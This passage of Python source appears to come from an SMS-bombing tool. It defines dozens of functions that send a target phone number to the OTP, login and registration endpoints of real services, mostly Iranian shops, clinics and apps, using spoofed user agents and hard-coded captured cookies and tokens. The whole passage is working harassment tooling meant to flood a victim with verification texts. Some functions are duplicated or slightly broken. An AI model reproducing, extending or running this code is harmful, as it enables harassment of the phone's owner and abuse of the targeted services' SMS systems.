            post(url=paU, headers=paH, data=paD)
            return True
        except:
            pass


    def didnegar(phone):
        paD = f'action=digits_check_mob&countrycode=%2B90&mobileNo={phone.split("+90")[1]}&csrf=4c9ac22ff4&login=1&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&mobmail=0{phone.split("+90")[1]}&dig_otp=&digits_login_remember_me=1&dig_nounce=4c9ac22ff4'
        paU = 'https://www.didnegar.com/wp-admin/admin-ajax.php'
        paH = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '143','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': 'PHPSESSID=881f0d244b83c1db49d4c39e5fe7b108; digits_countrycode=90; _5f9d3331dba5a62b1268c532=true','origin': 'https://www.didnegar.com','referer': 'https://www.didnegar.com/my-account/?login=true&back=home&page=1','user-agent': generate_user_agent(os="linux"),'x-requested-with': 'XMLHttpRequest'}
        try:
            post(url=paU, headers=paH, data=paD)
            return True
        except:
            pass


    def baskol(phone):
        baJ = {"phone": '0'+phone.split('+90')[1]}
        baU = 'https://www.buskool.com/send_verification_code'
        baH = {'accept': 'application/json, text/plain, */*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-type': 'application/json;charset=UTF-8','cookie': 'laravel_session=2Gp6A82VC8CPMgaB7sI0glrGP52XyjXNKnNAeZq3','origin': 'https://www.buskool.com','referer': 'https://www.buskool.com/register','user-agent': generate_user_agent(os="linux"),'x-csrf-token': 'trUVHIRWtjE58Fn9Pud1ciz2XaTbTgFHgCLsPykD','x-requested-with': 'XMLHttpRequest'}
        try:
            post(url=baU, headers=baH, json=baJ)
            return True
        except:
            pass


    def basalam(phone):
        baJ = {"variables": {"mobile": '0'+phone.split('+90')[1]},"query": "mutation verificationCodeRequest($mobile: MobileScalar!) { mobileVerificationCodeRequest(mobile: $mobile) { success } }"}
        baU = 'https://api.basalam.com/user'
        baH = {'accept': 'application/json, text/plain, */*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','authorization': 'Bearer undefined','content-length': '168','content-type': 'application/json;charset=UTF-8','origin': 'https://basalam.com','referer': 'https://basalam.com/','user-agent': generate_user_agent(os="linux"),'x-client-info': '{"name":"web.public"}','x-creation-tags': '{"app":"web","client":"customer","os":"linux","device":"desktop","uri":"/accounts","fullPath":"/accounts","utms":"organic","landing_url":"basalam.com%2Faccounts","tag":[null]}'}
        try:
            post(url=baU, headers=baH, json=baJ)
            return True
        except:
            pass


    def see5(phone):
        seD = {'mobile': '0'+phone.split('+90')[1],'action': 'sendsms'}
        seU = 'https://crm.see5.net/api_ajax/sendotp.php'
        seH = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '33','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': '_ga=GA1.2.1824452401.1639326535; _gid=GA1.2.438992536.1639326535; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22cpc%22%2C%22campaign%22:%22adwords%22%2C%22content%22:%22adwords%22}; crisp-client%2Fsession%2Fc55c0d24-90fe-419a-862f-0b31e955fd59=session_812ec81d-13c1-4a69-a494-ad54e1f290ef; __utma=55084201.1824452401.1639326535.1639326540.1639326540.1; __utmc=55084201; __utmz=55084201.1639326540.1.1.utmcsr=Ads|utmgclid=EAIaIQobChMIsfOridfe9AIV5o5oCR2zJQjCEAMYAiAAEgLT8fD_BwE|utmccn=Exact-shopsaz|utmcmd=cpc|utmctr=(not%20provided); _gac_UA-62787234-1=1.1639326540.EAIaIQobChMIsfOridfe9AIV5o5oCR2zJQjCEAMYAiAAEgLT8fD_BwE; __utmt=1; __utmb=55084201.3.10.1639326540; WHMCSkYBsAa1NDZ2k=6ba6de855ce426e25ea6bf402d1dc09c','origin': 'https://crm.see5.net','referer': 'https://crm.see5.net/clientarea.php','user-agent': generate_user_agent(os="linux"),'x-requested-with': 'XMLHttpRequest'}
        try:
            post(url=seU, headers=seH, data=seD).text
            return True
        except:
            pass


    def ghabzino(phone):
        ghJ = {"Parameters": {"ApplicationType": "Web","ApplicationUniqueToken": None,"ApplicationVersion": "1.0.0","MobileNumber": '0'+phone.split('+90')[1]}}
        ghU = 'https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode'
        ghH = {'accept': 'application/json, text/plain, */*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-type': 'application/json','origin': 'https://ghabzino.com','referer': 'https://ghabzino.com/','user-agent': generate_user_agent(os="linux")}
        try:
            get(url=ghU, headers=ghH, json=ghJ)
            return True
        except:
            pass


    def simkhanF(phone):
        ghJ = {"mobileNumber": '0'+phone.split('+90')[1],"ReSendSMS": False}
        ghU = 'https://www.simkhanapi.ir/api/users/registerV2'
        ghH = {'Accept': 'application/json','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.9','Authorization': 'Bearer undefined','Connection': 'keep-alive','Content-Type': 'application/json','Host': 'www.simkhanapi.ir','Origin': 'https://simkhan.ir','Referer': 'https://simkhan.ir/','User-Agent': generate_user_agent(os="linux")}
        try:
            post(url=ghU, headers=ghH, json=ghJ)
            return True
        except:
            pass


    def simkhanT(phone):
        ghJ = {"mobileNumber": '0'+phone.split('+90')[1],"ReSendSMS": True}
        ghU = 'https://www.simkhanapi.ir/api/users/registerV2'
        ghH = {'Accept': 'application/json','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.9','Authorization': 'Bearer undefined','Connection': 'keep-alive','Content-Type': 'application/json','Host': 'www.simkhanapi.ir','Origin': 'https://simkhan.ir','Referer': 'https://simkhan.ir/','User-Agent': generate_user_agent(os="linux")}
        try:
            post(url=ghU, headers=ghH, json=ghJ)
            return True
        except:
            pass


    def drsaina(phone):
        ghD = f"__RequestVerificationToken=CfDJ8NPBKm5eTodHlBQhmwjQAVUgCtuEzkxhMWwcm9NyjTpueNnMgHEElSj7_JXmfrsstx9eCNrsZ5wiuLox0OSfoEvDvJtGb7NC5z6Hz7vMEL4sBlF37_OryYWJ0CCm4gpjmJN4BxSjZ24pukCJF2AQiWg&noLayout=False&action=checkIfUserExistOrNot&lId=&codeGuid=00000000-0000-0000-0000-000000000000&PhoneNumber={'0'+phone.split('+90')[1]}&confirmCode=&fullName=&Password=&Password2="
        ghU = 'https://www.drsaina.com/RegisterLogin?ReturnUrl=%2Fconsultation'
        ghH = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','cookie': '.AspNetCore.Antiforgery.ej9TcqgZHeY=CfDJ8NPBKm5eTodHlBQhmwjQAVWqg8-UO73YXzMYVhYk28IlZQexrnyEhYldxs2Ylnp3EZE2o3tccNQ0E7vRSUGVMNDfmcFOKPcUCG7sysT7unE5wui_vwzMvyCNDqIRZ1Wxd2AKD3s3lu-2BvFOXc_j7ts; anonymousId=-fmvaw07O1miRXbHtKTVT; segmentino-user={"id":"-fmvaw07O1miRXbHtKTVT","userType":"anonymous"}; _613757e830b8233caf20b7d3=true; _ga=GA1.2.1051525883.1639482327; _gid=GA1.2.2109855712.1639482327; __asc=bf42042917db8c3006a2b4dcf49; __auc=bf42042917db8c3006a2b4dcf49; analytics_token=a93f2bb1-30d0-4e99-18cc-b84fcda27ae9; yektanet_session_last_activity=12/14/2021; _yngt_iframe=1; _gat_UA-126198313-1=1; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22cpc%22%2C%22campaign%22:%22adwords%22%2C%22content%22:%22adwords%22}; analytics_session_token=efcee442-344d-1374-71b8-60ca960029c9; _yngt=d628b56e-eef52-280a4-4afe0-012e33e23ce9b; _gac_UA-126198313-1=1.1639482345.EAIaIQobChMImrmRrJvj9AIV2ZTVCh07_gUpEAAYASAAEgILoPD_BwE; cache_events=true','origin': 'https://www.drsaina.com','referer': 'https://www.drsaina.com/RegisterLogin?ReturnUrl=%2Fconsultation','upgrade-insecure-requests': '1','user-agent': generate_user_agent(os="linux")}
        try:
            post(url=ghU, headers=ghH, data=ghD).text
            return True
        except:
            pass


    def limome(phone):
        liD = {'mobileNumber': phone.split('+90')[1],'country': '1'}
        liU = 'https://my.limoome.com/api/auth/login/otp'
        liH = {'Accept': 'application/json, text/javascript, */*; q=0.01','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.9','Connection': 'keep-alive','Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8','Cookie': 'sess=00da3860-929a-4429-aef9-82bb64f9a439; basalam-modal=1','Host': 'my.limoome.com','Origin': 'https://my.limoome.com','Referer': 'https://my.limoome.com/login?redirectlogin=%252Fdiet%252Fpayment','User-Agent': generate_user_agent(os="linux"),'X-Requested-With': 'XMLHttpRequest'}
        try:
            post(url=liU, headers=liH, data=liD)
            return True
        except:
            pass


    def bimito(phone):
        liU = f"https://bimito.com/api/core/app/user/checkLoginAvailability/%7B%22phoneNumber%22%3A%220{phone.split('+90')[1]}%22%7D"
        liH = {'accept': 'application/json, text/plain, */*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','cookie': '_gcl_aw=GCL.1639580987.EAIaIQobChMI1t3Y-Irm9AIVk4xoCR0UowKLEAAYASAAEgLCS_D_BwE; _gcl_au=1.1.1134321035.1639580987; _ga=GA1.2.74824389.1639580987; _gid=GA1.2.40868592.1639580992; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22cpc%22%2C%22campaign%22:%22adwords%22%2C%22content%22:%22adwords%22}; analytics_token=9fbae680-00a7-8cbf-6be6-90980eae790f; yektanet_session_last_activity=12/15/2021; _yngt_iframe=1; _gac_UA-89339097-1=1.1639580999.EAIaIQobChMI1t3Y-Irm9AIVk4xoCR0UowKLEAAYASAAEgLCS_D_BwE; _yngt=d628b56e-eef52-280a4-4afe0-012e33e23ce9b; _clck=dlyt9o|1|exa|0; crisp-client%2Fsession%2Fbde9082c-438a-4943-b9b5-362fed0a182a=session_2fdd45a5-8c9d-4638-b21a-40a2ebd422db; _clsk=ktdj0|1639581807259|2|1|d.clarity.ms/collect; _ga_5LWTRKET98=GS1.1.1639580986.1.1.1639581904.60','device': 'web','deviceid': '3','origin': 'https://bimito.com','referer': 'https://bimito.com/','user-agent': generate_user_agent(os="linux"),'user-token': 'swS1oSzN22kTVTI8DqtRhUrgUfsKBiRdBeosjlczNV07XSbeVHB7R622Mw9O7uzp'}
        try:
            post(url=liU, headers=liH)
            return True
        except:
            pass


    def seebirani(phone):
        liJ = {"username": "0"+phone.split('+90')[1]}
        liU = "https://sandbox.sibirani.ir/api/v1/user/invite"
        liH = {'accept': 'application/json','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-type': 'application/json','origin': 'https://developer.sibirani.com','referer': 'https://developer.sibirani.com/','user-agent': generate_user_agent(os="mac")}
        try:
            post(url=liU, headers=liH, json=liJ)
            return True
        except:
            pass


    def mihanpezeshk(phone):
        gaD = f'_token=bBSxMx7ifcypKJuE8qQEhahIKpcVApWdfZXFkL8R&mobile={"0"+phone.split("+90")[1]}&recaptcha='
        gaU = 'https://www.mihanpezeshk.com/ConfirmCodeSbm_Patient'
        gaH = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','cookie': 'XSRF-TOKEN=eyJpdiI6IitzYVZRQzFLdGlKNHRHRjIxb3R4VWc9PSIsInZhbHVlIjoianR6SXBJXC9rUStMRCs0ajUzalNjM1pMN053bUNtSlJ5dzYrVzFxV1dtXC9SREp4OTJ0Wm1RWW9yRVwvM29Cc3l4SCIsIm1hYyI6IjdjODczZWI4Y2Q2N2NhODVkNjE5YTRkOWVhNjRhNDRlNmViZjhlNDVkNDYwODFkNzViOTU2ZTdjYTUwZjhjMWUifQ%3D%3D; laravel_session=eyJpdiI6ImU3dlpRdXV1XC9TMmJEWk1LMkFTZGJRPT0iLCJ2YWx1ZSI6IktHTWF0bFlJU0VqVCthamp5aW1GRHdBM1lNcjNMcVFxMWM5Ynd3clZLQzdva2ZJWXRiRU4xaUhyMnVHMG90RkUiLCJtYWMiOiJkZWRmMGM5YzFiNDNiOTJjYWFiZDc0MjYxMDUyMzBmYTMzMmI5ZTBkODA1YTMxODQyYzM2NjVjZWExZmYwMzdhIn0%3D','origin': 'https://www.mihanpezeshk.com','referer': 'https://www.mihanpezeshk.com/confirmcodePatient','upgrade-insecure-requests': '1','user-agent': generate_user_agent(os="linux")}
        try:
            post(url=gaU, headers=gaH, data=gaD)
            return True
        except:
            pass


    def mek(phone):
        meU = 'https://www.hamrah-mechanic.com/api/v1/auth/login'
        meH = {"Accept": "application/json","Accept-Encoding": "gzip, deflate, br","Accept-Language": "en-US,en;q=0.5","Connection": "keep-alive","Content-Type": "application/json","Cookie": "_ga=GA1.2.1307952465.1641249170; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; analytics_token=2527d893-9de1-8fee-9f73-d666992dd3d5; _yngt=9d6ba2d2-fd1c-4dcc-9f77-e1e364af4434; _hjSessionUser_619539=eyJpZCI6IjcyOTJiODRhLTA2NGUtNTA0Zi04Y2RjLTA2MWE3ZDgxZDgzOSIsImNyZWF0ZWQiOjE2NDEyNDkxNzEzMTUsImV4aXN0aW5nIjp0cnVlfQ==; _gid=GA1.2.284804399.1642278349; _gat_gtag_UA_106934660_1=1; _gat_UA-0000000-1=1; analytics_session_token=238e3f23-aff7-8e3a-f1d4-ef4f6c471e2b; yektanet_session_last_activity=1/15/2022; _yngt_iframe=1; _gat_UA-106934660-1=1; _hjIncludedInSessionSample=0; _hjSession_619539=eyJpZCI6IjRkY2U2ODUwLTQzZjktNGM0Zi1iMWUxLTllY2QzODA3ODhiZCIsImNyZWF0ZWQiOjE2NDIyNzgzNTYzNjgsImluU2FtcGxlIjpmYWxzZX0=; _hjIncludedInPageviewSample=1; _hjAbsoluteSessionInProgress=0","Host": "www.hamrah-mechanic.com","Origin": "https://www.hamrah-mechanic.com","Referer": "https://www.hamrah-mechanic.com/membersignin/","Source": "web","TE": "trailers","User-Agent": generate_user_agent(os="linux")}
        meD = {"landingPageUrl": "https://www.hamrah-mechanic.com/","orderPageUrl": "https://www.hamrah-mechanic.com/membersignin/","phoneNumber": "0"+phone.split("+90")[1],"prevDomainUrl": None,"prevUrl": None,"referrer": "https://www.google.com/"}
        try:
            post(url=meU, headers=meH, data=meD)
            return True
        except:
            pass


    def hyperjan(phone):
        rhead = {"user-agent": generate_user_agent()}
        snapD = {"mobile": "0"+phone.split("+90")[1]}
        try:
            post(url="https://shop.hyperjan.ir/api/users/manage", json=snapD, headers=rhead)
            return True
        except:
            pass


    def digikala(phone):
        rhead = {"user-agent": generate_user_agent()}
        n4 = {"username": "0"+phone.split("+90")[1]}
        try:
            post(url="https://api.digikala.com/v1/user/authenticate/", data=n4, headers=rhead)
            return True
        except:
            pass


    def devslop(phone):
        n5 = phone.split("+90")[1]
        n4 = f"number=0{n5}&state=number&"
        headers = {"Content-Type": "application/x-www-form-urlencoded; charset\u003dUTF-8","User-Agent": generate_user_agent(os="android"), "Host": "i.devslop.app", "Connection": "Keep-Alive", "Accept-Encoding": "gzip", "Content-Length": "32"}
        try:
            post(url="https://i.devslop.app/app/ifollow/api/otp.php", headers=headers, data=n4)
            return True
        except:
            pass


    def hiword(phone):
        rhead = {"user-agent": generate_user_agent()}
        n4 = {"identifier": "0"+phone.split("+90")[1]}
        try:
            post(url="https://hiword.ir/wp-json/otp-login/v1/login", data=n4, headers=rhead)
            return True
        except:
            pass


    def abantether(phone):
        rhead = {"user-agent": generate_user_agent()}
        n4 = {"phoneNumber": "0"+phone.split("+90")[1]}
        try:
            post(url="https://abantether.com/users/register/phone/send/", data=n4, headers=rhead)
            return True
        except:
            pass


    def bit24(phone):
        rhead = {"user-agent": generate_user_agent()}
        n4 = {"mobile": "0"+phone.split("+90")[1]}
        try:
            post(url="https://api.bit24.cash/api/v3/auth/check-mobile", data=n4, headers=rhead)
            return True
        except:
            pass


    def dicardo(phone):
        rhead = {"user-agent": generate_user_agent()}
        n4 = {"phone": "0"+phone.split("+90")[1]}
        try:
            post(url="https://dicardo.com/main/sendsms", data=n4, headers=rhead)
            return True
        except:
            pass


    def ghasedak24(phone):
        rhead = {"user-agent": generate_user_agent()}
        n4 = {"username": "0"+phone.split("+90")[1]}
        try:
            post(url="https://ghasedak24.com/user/ajax_register", data=n4, headers=rhead)
            return True
        except:
            pass


    def tikban(phone):
        rhead = {"user-agent": generate_user_agent()}
        n4 = {"CellPhone": "0"+phone.split("+90")[1]}
        try:
            post(url="https://tikban.com/Account/LoginAndRegister", data=n4, headers=rhead)
            return True
        except:
            pass


    def digistyle(phone):
        rhead = {"user-agent": generate_user_agent()}
        n4 = {"loginRegister[email_phone]": "0"+phone.split("+90")[1]}
        try:
            post(url="https://www.digistyle.com/users/login-register/", data=n4, headers=rhead)
            return True
        except:
            pass


    def banankala(phone):
        rhead = {"user-agent": generate_user_agent()}
        n4 = {"Mobile": "0"+phone.split("+90")[1]}
        try:
            post(url="https://banankala.com/home/login", data=n4, headers=rhead)
            return True
        except:
            pass


    def iranketab(phone):
        rhead = {"user-agent": generate_user_agent()}
        n4 = {"UserName": "0"+phone.split("+90")[1]}
        try:
            post(url="https://www.iranketab.ir/account/register", data=n4, headers=rhead)
            return True
        except:
            pass


    def ketabchi(phone):
        rhead = {"user-agent": generate_user_agent()}
        n4 = {"phoneNumber": "0"+phone.split("+90")[1]}
        try:
            post(url="https://ketabchi.com/api/v1/auth/requestVerificationCode", data=n4, headers=rhead)
            return True
        except:
            pass


    def tapsi(phone):
        rhead = {"user-agent": generate_user_agent()}
        n5 = phone.split("+90")[1]
        try:
            post(url=f"https://join.tapsi.ir/smsConfirm?phoneNumber=0{n5}", headers=rhead)
            return True
        except:
            pass


    def offdecor(phone):
        n4 = {"phone": "0"+phone.split("+90")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://www.offdecor.com/index.php?route=account/login/sendCode", data=n4, headers=rhead)
            return True
        except:
            pass


    def exo(phone):
        n4 = {"mobile_number": "0"+phone.split("+90")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://exo.ir/index.php?route=account/mobile_login", data=n4, headers=rhead)
            return True
        except:
            pass


    def shahrfarsh(phone):
        n4 = {"phoneNumber": "0"+phone.split("+90")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://shahrfarsh.com/Account/Login", data=n4, headers=rhead)
            return True
        except:
            pass

            
    def takfarsh(phone):
        n4 = {"phone_email": "0"+phone.split("+90")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://takfarsh.com/wp-content/themes/bakala/template-parts/send.php", data=n4, headers=rhead)
            return True
        except:
            pass


    def beheshticarpet(phone):
        n4 = {"billing_mobile": "0"+phone.split("+90")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://shop.beheshticarpet.com/my-account/", data=n4, headers=rhead)
            return True
        except:
            pass


    def khanoumi(phone):
        n4 = {"mobile": "0"+phone.split("+90")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://www.khanoumi.com/accounts/sendotp", data=n4, headers=rhead)
            return True
        except:
            pass


    def rojashop(phone):
        n4 = {"mobile": "0"+phone.split("+90")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://rojashop.com/api/auth/sendOtp", data=n4, headers=rhead)
            return True
        except:
            pass


    def dadpardaz(phone):
        n4 = {"mobile": "0"+phone.split("+90")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://dadpardaz.com/advice/getLoginConfirmationCode", data=n4, headers=rhead)
            return True
        except:
            pass


    def rokla(phone):
        n4 = {"mobile": "0"+phone.split("+90")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://api.rokla.ir/api/request/otp", data=n4, headers=rhead)
            return True
        except:
            pass


    def khodro45(phone):
        n4 = {"mobile": "0"+phone.split("+90")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://khodro45.com/api/v1/customers/otp/", data=n4, headers=rhead)
            return True
        except:
            pass


    def mashinbank(phone):
        n4 = {"mobileNumber": "0"+phone.split("+90")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://mashinbank.com/api2/users/check", data=n4, headers=rhead)
            return True
        except:
            pass


    def pezeshket(phone):
        n4 = {"mobileNumber": "0"+phone.split("+90")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://api.pezeshket.com/core/v1/auth/requestCode", data=n4, headers=rhead)
            return True
        except:
            pass

    def virgool(phone):
        n4 = {"method": "phone", "identifier": phone}
        rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://virgool.io/api/v1.4/auth/verify", data=n4, headers=rhead)
            return True
        except:
            pass

    def timcheh(phone):
        n4 = {"mobile": "0"+phone.split("+90")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://api.timcheh.com/auth/otp/send", data=n4, headers=rhead)
            return True
        except:
            pass


    def helsa(phone):
        n5 = phone.split("+90")[1]
        rhead = {"user-agent": generate_user_agent()}
        try:
            post(url=f"https://api.helsa.co/api/User/GetRegisterCode?mobileNumber=0{n5}&deviceId=050102153736100048967953736091842424&discountCode=&utm_content=&utm_source=&utm_campain=", headers=rhead)
            return True
        except:
            pass


    def paklean(phone):
        n4 = {"username": "0"+phone.split("+90")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://client.api.paklean.com/user/resendCode", json=n4, headers=rhead)
            return True
        except:
            pass
            
    def mobogift(phone):
        n4 = {"username": "0"+phone.split("+90")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://mobogift.com/signin", data=n4, headers=rhead)
            return True
        except:
            pass


    def iranicard(phone):
        n4 = {"mobile": "0"+phone.split("+90")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://api.iranicard.ir/api/v1/register", data=n4, headers=rhead)
            return True
        except:
            pass


    def pubgsell(phone):
        n5 = phone.split("+90")[1]
        rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://pubg-sell.ir/loginuser?username=0{n5}", headers=rhead)
            return True
        except:
            pass


    def tj8(phone):
        n4 = {"mobile": "0"+phone.split("+90")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://tj8.ir/auth/register", data=n4, headers=rhead)
            return True
        except:
            pass


    def mashinbank(phone):
        n4 = {"mobileNumber": "0"+phone.split("+90")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://mashinbank.com/api2/users/check", data=n4, headers=rhead)
            return True
        except:
            pass


    def cinematicket(phone):
        n4 = {"phone_number": "0"+phone.split("+90")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://cinematicket.org/api/v1/users/signup", data=n4, headers=rhead)
            return True
        except:
            pass


    def irantic(phone):
        n4 = {"mobile": "0"+phone.split("+90")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://www.irantic.com/api/login/request", data=n4, headers=rhead)
            return True
        except:
            pass


    def kafegheymat(phone):
        n4 = {"phone": "0"+phone.split("+90")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://kafegheymat.com/shop/getLoginSms", data=n4, headers=rhead)
            return True
        except:
            pass


    def express(phone):
        n4 = {"cellphone": "0"+phone.split("+90")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass?client=PWA&optionalClient=PWA&deviceType=PWA&appVersion=5.6.6&optionalVersion=5.6.6&UDID=bb65d956-f88b-4fec-9911-5f94391edf85", data=n4, headers=rhead)
            return True
        except:
            pass


    def delino(phone):
        n4 = {"mobile": "0"+phone.split("+90")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://www.delino.com/user/register", data=n4, headers=rhead)
            return True
        except:
            pass


    def alopeyk(phone):
        n4 = {"phone": "0"+phone.split("+90")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://alopeyk.com/api/sms/send.php", data=n4, headers=rhead)
            return True
        except:
            pass


    def tamland(phone):
        n4 = {"Mobile": "0"+phone.split("+90")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://1401api.tamland.ir/api/user/signup", data=n4, headers=rhead)
            return True
        except:
            pass


    def opco(phone):
        n4 = {"telephone": "0"+phone.split("+90")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://shop.opco.co.ir/index.php?route=extension/module/login_verify/update_register_code", data=n4, headers=rhead)
            return True
        except:
            pass


    def digikalajet(phone):
        n4 = {"phone": "0"+phone.split("+90")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://api.digikalajet.ir/user/login-register/", data=n4, headers=rhead)
            return True
        except:
            pass

    def melix(phone):
        n4 = {"mobile": "0"+phone.split("+90")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://melix.shop/site/api/v1/user/otp", json=n4, headers=rhead)
            return True
        except:
            pass

            
    def safiran(phone):
        n4 = {"mobile": "0"+phone.split("+90")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://safiran.shop/login", json=n4, headers=rhead)
            return True
        except:
            pass
